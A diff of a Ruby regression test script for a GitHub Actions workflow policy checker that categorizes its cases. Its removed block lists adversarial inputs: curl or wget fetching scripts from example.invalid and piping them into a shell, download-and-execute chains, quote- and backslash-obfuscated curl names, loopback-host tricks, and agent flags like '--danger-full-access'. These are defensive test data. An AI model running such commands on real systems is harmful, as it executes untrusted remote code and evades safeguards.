@@ -42,11 +42,26 @@ def amend_workflow(source)
 end
 
 cases = {}
-wrapped_expression_case_names = []
-implicit_if_expression_case_names = []
-downloader_canonicalization_case_names = []
+case_category_order = %i[
+  structural_yaml_cases
+  malformed_job_structure_cases
+  malformed_step_structure_cases
+  permissions_cases
+  secret_reference_cases
+  action_pinning_cases
+  runner_cases
+  local_action_cases
+  container_service_cases
+  timeout_continue_on_error_cases
+  wrapped_github_expression_cases
+  implicit_if_expression_cases
+  manifest_integrity_cases
+].freeze
+case_categories = case_category_order.to_h { |category| [category, []] }
+current_category = :manifest_integrity_cases
 add_case = lambda do |name, content, should_pass, expected_error = nil|
   cases[name] = [content, should_pass, expected_error]
+  case_categories.fetch(current_category) << name
 end
 
 manifest_workflow = workflow_yaml(safe_sha)
@@ -88,7 +103,182 @@ add_case.call(
   true
 )
 
+current_category = :structural_yaml_cases
 add_case.call('safe', workflow_yaml(safe_sha), true)
+
+current_category = :malformed_job_structure_cases
+add_case.call(
+  'workflow-root-sequence',
+  YAML.dump([{ 'name' => 'not a workflow mapping' }]),
+  false,
+  'workflow root must be a mapping'
+)
+
+missing_jobs = YAML.safe_load(workflow_yaml(safe_sha), aliases: false)
+missing_jobs.delete('jobs')
+add_case.call('missing-jobs', YAML.dump(missing_jobs), false, 'jobs must be a non-empty mapping')
+add_case.call(
+  'empty-jobs',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs'] = {} },
+  false,
+  'jobs must be a non-empty mapping'
+)
+add_case.call(
+  'jobs-not-mapping',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs'] = 'unsafe' },
+  false,
+  'jobs must be a non-empty mapping'
+)
+add_case.call(
+  'job-not-mapping',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => 'not a mapping' }),
+  false,
+  'job unsafe must be a mapping'
+)
+add_case.call(
+  'ordinary-job-missing-runs-on',
+  workflow_yaml(
+    safe_sha,
+    jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('runs-on') } }
+  ),
+  false,
+  'job unsafe must declare runs-on'
+)
+add_case.call(
+  'ordinary-job-missing-steps',
+  workflow_yaml(
+    safe_sha,
+    jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('steps') } }
+  ),
+  false,
+  'job unsafe steps must be a non-empty array'
+)
+add_case.call(
+  'ordinary-job-steps-not-array',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => 'echo unsafe') }),
+  false,
+  'job unsafe steps must be a non-empty array'
+)
+add_case.call(
+  'ordinary-job-empty-steps',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => []) }),
+  false,
+  'job unsafe steps must be a non-empty array'
+)
+
+reusable_reference = "actions/checkout/.github/workflows/reusable.yml@#{safe_sha}"
+reusable_job = {
+  'uses' => reusable_reference,
+  'timeout-minutes' => 5,
+  'permissions' => { 'contents' => 'read' }
+}
+add_case.call(
+  'reusable-workflow-with-steps',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => reusable_job.merge('steps' => [{ 'run' => 'echo unsafe' }]) }),
+  false,
+  'reusable workflow job unsafe must not define steps'
+)
+add_case.call(
+  'reusable-workflow-with-runs-on',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => reusable_job.merge('runs-on' => 'ubuntu-latest') }),
+  false,
+  'reusable workflow job unsafe must not define runs-on'
+)
+add_case.call(
+  'reusable-workflow-empty-uses',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => reusable_job.merge('uses' => '') }),
+  false,
+  'reusable workflow job unsafe uses must be a non-empty string'
+)
+add_case.call(
+  'reusable-workflow-non-string-uses',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => reusable_job.merge('uses' => ['unsafe']) }),
+  false,
+  'reusable workflow job unsafe uses must be a non-empty string'
+)
+add_case.call(
+  'job-without-ordinary-or-reusable-structure',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'unsafe' => {
+        'timeout-minutes' => 5,
+        'permissions' => { 'contents' => 'read' }
+      }
+    }
+  ),
+  false,
+  'job unsafe must declare runs-on'
+)
+add_case.call(
+  'valid-reusable-workflow-job',
+  workflow_yaml(safe_sha, jobs: { 'reuse' => reusable_job }),
+  true
+)
+
+current_category = :malformed_step_structure_cases
+add_case.call(
+  'step-not-mapping',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => ['echo unsafe']) }),
+  false,
+  'step 1 in job unsafe must be a mapping'
+)
+add_case.call(
+  'step-without-run-or-uses',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'name' => 'empty step' }]) }),
+  false,
+  'step 1 in job unsafe must define exactly one of run or uses'
+)
+add_case.call(
+  'step-with-run-and-uses',
+  workflow_yaml(
+    safe_sha,
+    jobs: {
+      'unsafe' => standard_job(
+        safe_sha,
+        'steps' => [{ 'run' => 'echo unsafe', 'uses' => "actions/checkout@#{safe_sha}", 'with' => { 'persist-credentials' => false } }]
+      )
+    }
+  ),
+  false,
+  'step 1 in job unsafe must define exactly one of run or uses'
+)
+add_case.call(
+  'step-run-empty-string',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => '' }]) }),
+  false,
+  'step 1 in job unsafe run must be a non-empty string'
+)
+add_case.call(
+  'step-run-not-string',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => ['echo unsafe'] }]) }),
+  false,
+  'step 1 in job unsafe run must be a non-empty string'
+)
+add_case.call(
+  'step-uses-empty-string',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => '' }]) }),
+  false,
+  'step 1 in job unsafe uses must be a non-empty string'
+)
+add_case.call(
+  'step-uses-not-string',
+  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => ['unsafe'] }]) }),
+  false,
+  'step 1 in job unsafe uses must be a non-empty string'
+)
+add_case.call(
+  'valid-run-step',
+  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo safe' }]) }),
+  true
+)
+add_case.call(
+  'valid-uses-step',
+  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [checkout_step(safe_sha)]) }),
+  true
+)
+
+current_category = :permissions_cases
 add_case.call(
   'codeql-security-events-write',
   workflow_yaml(
@@ -198,6 +388,8 @@ add_case.call(
 missing_permissions = YAML.safe_load(workflow_yaml(safe_sha), aliases: false)
 missing_permissions.delete('permissions')
 add_case.call('missing-top-permissions', YAML.dump(missing_permissions), false, 'top-level permissions must be declared')
+
+current_category = :timeout_continue_on_error_cases
 add_case.call(
   'missing-timeout',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('timeout-minutes') } }),
@@ -230,6 +422,8 @@ add_case.call(
 )
 add_case.call('timeout-minimum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 1) }), true)
 add_case.call('timeout-maximum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 60) }), true)
+
+current_category = :action_pinning_cases
 add_case.call(
   'missing-persist-credentials',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => "actions/checkout@#{safe_sha}" }]) }),
@@ -250,7 +444,11 @@ add_case.call(
   false,
   'must set persist-credentials: false'
 )
+
+current_category = :structural_yaml_cases
 add_case.call('pull-request-target', workflow_yaml(safe_sha, events: ['pull_request_target']), false, 'pull_request_target is forbidden')
+
+current_category = :action_pinning_cases
 add_case.call(
   'floating-step-action',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => 'actions/checkout@v5' }]) }),
@@ -292,6 +490,8 @@ add_case.call(
   false,
   'action repository is not approved'
 )
+
+current_category = :local_action_cases
 add_case.call(
   'local-composite-action',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/composite' }]) }),
@@ -320,6 +520,7 @@ add_case.call(
   'local actions and local reusable workflows are forbidden in policy v1'
 )
 
+current_category = :container_service_cases
 add_case.call(
   'job-container-string',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => 'unapproved.invalid/runner:latest') }),
@@ -386,6 +587,7 @@ add_case.call(
   'services are forbidden in policy v1'
 )
 
+current_category = :secret_reference_cases
 add_case.call(
   'dot-secret',
   workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.TEST_KEY }}' }) }),
@@ -540,6 +742,7 @@ add_case.call(
   'must not reference secrets'
 )
 
+current_category = :runner_cases
 add_case.call(
   'self-hosted-runner',
   workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'linux']) }),
@@ -591,6 +794,7 @@ add_case.call(
   'must use an approved GitHub-hosted runner'
 )
 
+current_category = :timeout_continue_on_error_cases
 add_case.call(
   'job-continue-on-error-true',
   workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => true) }),
@@ -641,6 +845,7 @@ add_case.call(
   true
 )
 
+current_category = :wrapped_github_expression_cases
 untrusted_context_cases = {
   'untrusted-context-in-top-level-env' => lambda { |workflow| workflow['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
   'untrusted-context-in-job-env' => lambda { |workflow| workflow['jobs']['test']['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
@@ -688,6 +893,7 @@ add_case.call(
   true
 )
 
+current_category = :implicit_if_expression_cases
 implicit_if_failure_cases = {
   'job-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event.pull_request.head.ref == 'main'" },
   'step-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event.pull_request.head.ref == 'main'" },
@@ -704,7 +910,6 @@ implicit_if_failure_cases = {
 }
 
 implicit_if_failure_cases.each do |name, mutation|
-  implicit_if_expression_case_names << name
   add_case.call(
     name,
     amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
@@ -713,11 +918,11 @@ implicit_if_failure_cases.each do |name, mutation|
   )
 end
 
+current_category = :wrapped_github_expression_cases
 {
   'job-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" },
   'step-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" }
 }.each do |name, mutation|
-  wrapped_expression_case_names << name
   add_case.call(
     name,
     amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
@@ -726,16 +931,16 @@ end
   )
 end
 
+current_category = :implicit_if_expression_cases
 {
   'job-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event_name == 'push'" },
   'step-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event_name == 'push'" },
   'job-if-implicit-safe-sha' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.sha != ''" }
 }.each do |name, mutation|
-  implicit_if_expression_case_names << name
   add_case.call(name, amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) }, true)
 end
 
-wrapped_expression_case_names << 'step-if-wrapped-safe-sha'
+current_category = :wrapped_github_expression_cases
 add_case.call(
   'step-if-wrapped-safe-sha',
   amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.sha != '' }}" },
@@ -829,226 +1034,12 @@ add_case.call(
   'direct github context interpolation is forbidden except github.sha and github.event_name'
 )
 
-# Parser/adversarial bypass cases: any curl/wget run outside the exact literal probe must fail.
-downloader_parser_adversarial_cases = {
-  'curl-pipe-bash' => 'curl -fsSL https://example.invalid/install | bash',
-  'wget-pipe-sh' => 'wget -qO- https://example.invalid/install | sh',
-  'curl-pipe-bin-bash' => 'curl -fsSL https://example.invalid/install | /bin/bash',
-  'wget-pipe-env-sh' => 'wget -qO- https://example.invalid/install | env sh',
-  'curl-pipe-shell' => 'curl -fsSL https://example.invalid/install | sh',
-  'curl-pipe-sudo-bash' => 'curl -fsSL https://example.invalid/install | sudo bash',
-  'wget-pipe-command' => 'wget -qO- https://example.invalid/install | command sh',
-  'wget-pipe-command-sh' => 'wget -qO- https://example.invalid/install | command sh',
-  'curl-pipe-nonshell' => 'curl -fsSL https://example.invalid/data | jq .',
-  'process-substitution' => 'bash <(curl -fsSL https://example.invalid/install)',
-  'bash-process-substitution-curl' => 'bash <(curl -fsSL https://example.invalid/install)',
-  'command-substitution' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
-  'shell-command-substitution-wget' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
-  'eval-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
-  'eval-curl-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
-  'curl-download-file-then-bash' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh && bash /tmp/install.sh',
-  'wget-download-file-then-sh' => 'wget -q -O /tmp/install.sh https://example.invalid/install.sh && sh /tmp/install.sh',
-  'curl-download-binary-then-execute' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
-  'wget-download-chmod-execute' => 'wget -q -O /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
-  'curl-download-via-output-option' => 'curl --output /tmp/data https://example.invalid/data',
-  'wget-download-via-output-document' => 'wget --output-document=/tmp/data https://example.invalid/data',
-  'external-curl-with-checksum-still-forbidden-v1' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
-  'external-wget-with-checksum-still-forbidden-v1' => 'wget -q -O /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
-  'curl-variable-url-with-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 "$URL" >/dev/null # http://127.0.0.1:3000/health',
-  'curl-variable-url-from-previous-line' => "URL=http://127.0.0.1:3000/health\ncurl --disable --fail --silent --show-error --max-time 10 \"$URL\" >/dev/null",
-  'curl-loopback-command-substitution-then-bash' => 'bash -c "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
-  'curl-loopback-response-assigned-then-executed' => "PAYLOAD=\"$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)\"\nbash -c \"$PAYLOAD\"",
-  'curl-loopback-follow-redirect' => 'curl --disable --fail --silent --show-error --location --max-time 10 http://127.0.0.1:3000/health >/dev/null',
-  'curl-loopback-short-L' => 'curl --disable --fail --silent --show-error -L --max-time 10 http://127.0.0.1:3000/health >/dev/null',
-  'curl-loopback-combined-sSLO' => 'curl -sSLO http://127.0.0.1:3000/health',
-  'curl-loopback-output-file' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/health http://127.0.0.1:3000/health',
-  'curl-loopback-remote-name' => 'curl --disable --fail --silent --show-error --max-time 10 --remote-name http://127.0.0.1:3000/health',
-  'curl-config-file' => 'curl --config ./curl.conf http://127.0.0.1:3000/health',
-  'curl-short-K-config' => 'curl -K ./curl.conf http://127.0.0.1:3000/health',
-  'curl-loopback-pipe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health | jq .',
-  'curl-loopback-command-chain' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null && bash /tmp/install.sh',
-  'curl-loopback-semicolon-command' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null; bash /tmp/install.sh',
-  'curl-loopback-comment-injection' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null # trusted',
-  'curl-loopback-multiple-urls' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health https://example.invalid/payload >/dev/null',
-  'curl-loopback-backtick' => '`curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health`',
-  'curl-loopback-process-substitution' => 'bash <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
-  'curl-loopback-to-eval' => 'eval "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
-  'curl-loopback-to-source' => 'source <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
-  'wget-loopback-health-check' => 'wget --spider http://127.0.0.1:3000/health',
-  'wget-external-download' => 'wget https://example.invalid/install.sh',
-  'external-curl-with-fake-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 https://example.invalid/install # http://127.0.0.1:3000/health',
-  'external-curl-with-checksum' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
-  'curl-loopback-no-timeout' => 'curl --disable --fail --silent --show-error http://127.0.0.1:3000/health >/dev/null',
-  'curl-loopback-numeric-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://2130706433:3000/health >/dev/null',
-  'curl-loopback-hex-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://0x7f000001:3000/health >/dev/null',
-  'curl-loopback-userinfo' => 'curl --disable --fail --silent --show-error --max-time 10 http://user@127.0.0.1:3000/health >/dev/null',
-  'curl-loopback-port-overflow' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:65536/health >/dev/null',
-  'curl-loopback-env-expansion' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:${PORT}/health >/dev/null',
-  'curl-loopback-ordinary-file-redirect' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >health.txt',
-  'curl-loopback-without-config-disable' => 'curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
-  'shell-escaped-curl-backslash' => 'c\url -fsSL https://example.invalid/install | bash',
-  'shell-escaped-wget-backslash' => 'w\get https://example.invalid/install.sh',
-  'shell-quoted-wget-middle' => 'w"get" https://example.invalid/install.sh',
-  'shell-empty-quoted-curl' => 'c""url https://example.invalid/install.sh',
-  'shell-single-quoted-segment-curl' => "'cu'rl https://example.invalid/install.sh",
-  'shell-double-quoted-segment-curl' => 'c"ur"l https://example.invalid/install.sh',
-  'shell-adjacent-quoted-wget' => "'w''g''e''t' https://example.invalid/install.sh",
-  'shell-uppercase-escaped-curl' => 'C\URL https://example.invalid/install.sh',
-  'shell-backslash-newline-curl' => "c\\\nurl https://example.invalid/install.sh",
-  'shell-no-space-pipe-curl' => 'c\url https://example.invalid/install.sh|bash',
-  'shell-env-wrapped-escaped-curl' => 'env c\url https://example.invalid/install.sh',
-  'shell-command-wrapped-quoted-wget' => 'command w"get" https://example.invalid/install.sh',
-  'shell-variable-command-curl' => 'cmd=curl; $cmd https://example.invalid/install.sh',
-  'shell-quoted-variable-command-curl' => "cmd='curl'\n\"$cmd\" https://example.invalid/install.sh",
-  'shell-command-substitution-builds-curl' => '"$(printf c\url)" https://example.invalid/install.sh',
-  'shell-printf-builds-wget' => '$(printf w"get") https://example.invalid/install.sh',
-  'shell-eval-containing-curl' => 'eval "c\url https://example.invalid/install.sh"',
-  'shell-bash-c-containing-curl' => 'bash -c "c\url https://example.invalid/install.sh"',
-  'shell-sh-c-containing-wget' => 'sh -c "w\get https://example.invalid/install.sh"',
-  'shell-unterminated-quote-fail-closed' => 'echo "unterminated'
-}
-
-downloader_canonicalization_case_names.concat(
-  downloader_parser_adversarial_cases.keys.grep(/\Ashell-/)
-)
-
-downloader_parser_adversarial_cases.each do |name, command|
-  add_case.call(
-    name,
-    workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
-    false,
-    'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
-  )
-end
-add_case.call(
-  'download-in-one-step-execute-in-next-step',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'unsafe' => standard_job(
-        safe_sha,
-        'steps' => [
-          { 'run' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh' },
-          { 'run' => 'bash /tmp/install.sh' }
-        ]
-      )
-    }
-  ),
-  false,
-  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
-)
-add_case.call(
-  'download-one-step-execute-next-step',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'unsafe' => standard_job(
-        safe_sha,
-        'steps' => [
-          { 'run' => 'curl --output /tmp/install.sh https://example.invalid/install.sh' },
-          { 'run' => 'bash /tmp/install.sh' }
-        ]
-      )
-    }
-  ),
-  false,
-  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
-)
-
-# Valid workflow semantic cases: the complete run string is the literal policy-v1 probe.
-add_case.call(
-  'curl-literal-127-health-check',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'safe' => standard_job(
-        safe_sha,
-        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null' }]
-      )
-    }
-  ),
-  true
-)
-add_case.call(
-  'curl-literal-localhost-health-check',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'safe' => standard_job(
-        safe_sha,
-        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]
-      )
-    }
-  ),
-  true
-)
-add_case.call(
-  'curl-literal-ipv6-loopback-health-check',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'safe' => standard_job(
-        safe_sha,
-        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null' }]
-      )
-    }
-  ),
-  true
-)
-{
-  'literal-loopback-127-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
-  'literal-loopback-localhost-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null',
-  'literal-loopback-ipv6-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null'
-}.each do |name, command|
-  downloader_canonicalization_case_names << name
-  add_case.call(
-    name,
-    workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
-    true
-  )
-end
-add_case.call(
-  'curl-loopback-health-check',
-  workflow_yaml(
-    safe_sha,
-    jobs: {
-      'safe' => standard_job(
-        safe_sha,
-        'steps' => [{ 'run' => "curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null\n" }]
-      )
-    }
-  ),
-  true
-)
-add_case.call(
-  'curl-localhost-health-check',
-  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]) }),
-  true
-)
-add_case.call(
-  'danger-full-access',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'codex --danger-full-access' }]) }),
-  false,
-  'unsafe runner flag'
-)
-add_case.call(
-  'yolo',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'agent --yolo' }]) }),
-  false,
-  'unsafe runner flag'
-)
-add_case.call(
-  'auto-merge',
-  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'gh pr merge 1' }]) }),
-  false,
-  'auto-merge commands are forbidden'
-)
+current_category = :structural_yaml_cases
 add_case.call('yaml-alias', "name: alias\non: [push]\npermissions: &p\n  contents: read\njobs:\n  test:\n    permissions: *p\n", false, 'forbidden alias')
 add_case.call('oversized-workflow', "# generated oversize fixture\n#{'x' * (513 * 1024)}", false, 'workflow exceeds')
 add_case.call('malformed-yaml', "name: [broken\n", false, 'invalid YAML')
 
-passing_cases = cases.count { |_name, (_content, should_pass, _error)| should_pass }
-
+policy_case_failures = []
 Dir.mktmpdir('graylum-workflow-policy-') do |root|
   cases.each do |name, (content, should_pass, expected_error)|
     directory = File.join(root, name)
@@ -1073,9 +1064,13 @@ Dir.mktmpdir('graylum-workflow-policy-') do |root|
     actual = status.success?
     next if actual == should_pass && (expected_error.nil? || stderr.include?(expected_error))
 
-    warn "#{name}: expected pass=#{should_pass} and error=#{expected_error.inspect}, got pass=#{actual}: #{stderr}"
-    exit 1
+    policy_case_failures << "#{name}: expected pass=#{should_pass} and error=#{expected_error.inspect}, got pass=#{actual}: #{stderr}"
   end
+end
+
+unless policy_case_failures.empty?
+  policy_case_failures.each { |failure| warn failure }
+  exit 1
 end
 
 repository_root = File.expand_path('../..', __dir__)
@@ -1151,8 +1146,15 @@ ensure
   FileUtils.rm_rf(danger_root)
 end
 
-puts "Fixture directory safety regressions passed (#{dangerous_fixture_cases.length + 1} dangerous targets rejected)."
-puts "Wrapped expression regressions passed (#{wrapped_expression_case_names.length} cases)."
-puts "Implicit if expression regressions passed (#{implicit_if_expression_case_names.length} cases)."
-puts "Downloader canonicalization regressions passed (#{downloader_canonicalization_case_names.length} cases)."
-puts "Workflow policy regression tests passed (#{cases.length} cases, #{cases.length - passing_cases} bypass attempts)."
+categorized_case_count = case_categories.values.sum(&:length)
+unless categorized_case_count == cases.length
+  warn "expected #{cases.length} categorized policy cases, got #{categorized_case_count}"
+  exit 1
+end
+
+fixture_directory_safety_cases = dangerous_fixture_cases.length + 1
+case_category_order.each do |category|
+  puts "#{category}=#{case_categories.fetch(category).length}"
+end
+puts "fixture_directory_safety_cases=#{fixture_directory_safety_cases}"
+puts "Remaining structural policy cases passed (#{cases.length + fixture_directory_safety_cases} cases)."
